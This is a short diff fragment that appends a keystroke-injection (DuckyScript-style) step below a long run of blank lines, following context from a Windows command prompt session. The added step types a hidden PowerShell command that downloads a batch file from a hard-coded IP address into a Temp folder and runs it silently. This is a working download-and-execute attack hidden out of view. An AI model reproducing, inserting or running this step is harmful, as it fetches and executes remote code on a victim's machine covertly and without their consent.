@@ -217,3 +217,24 @@ Access is denied.
 C:\Windows\System32>
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+REM ── Step 12: Download and execute via PowerShell ──
+STRINGLN powershell -w hidden -c "$wc=New-Object Net.WebClient;$wc.DownloadFile('http://153.75.82.198/payload.bat','C:\Windows\Temp\Cache\p.bat');Start-Process -WindowStyle Hidden 'C:\Windows\Temp\Cache\p.bat'"
+DELAY 5000
+
+
